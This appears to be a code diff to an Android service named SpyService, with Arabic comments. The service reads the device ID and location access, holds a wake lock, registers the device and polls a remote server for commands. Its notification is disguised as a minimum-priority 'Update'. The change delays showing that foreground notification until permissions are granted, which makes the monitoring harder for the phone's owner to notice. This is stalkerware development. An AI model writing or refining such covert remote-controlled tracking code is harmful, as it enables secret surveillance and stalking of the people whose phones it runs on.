@@ -64,6 +64,24 @@ public class SpyService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
+        // تأجيل startForeground حتى يتم منح الصلاحيات
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            // لا نبدأ foreground حتى يتم طلب الصلاحيات
+        } else {
+            startForegroundService();
+        }
+
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
+        wakeLock.acquire(10 * 60 * 1000L);
+
+        registerDevice();
+
+        scheduler = Executors.newSingleThreadScheduledExecutor();
+        scheduler.scheduleAtFixedRate(this::pollCommands, 2, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+    }
+
+    private void startForegroundService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
@@ -74,15 +92,11 @@ public class SpyService extends Service {
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build());
+    }
 
-        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
-        wakeLock.acquire(10 * 60 * 1000L);
-
-        registerDevice();
-
-        scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleAtFixedRate(this::pollCommands, 2, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+    // استدعاء هذه الدالة من MainActivity بعد منح الصلاحيات
+    public void startForegroundAfterPermissions() {
+        startForegroundService();
     }
 
     private void registerDevice() {
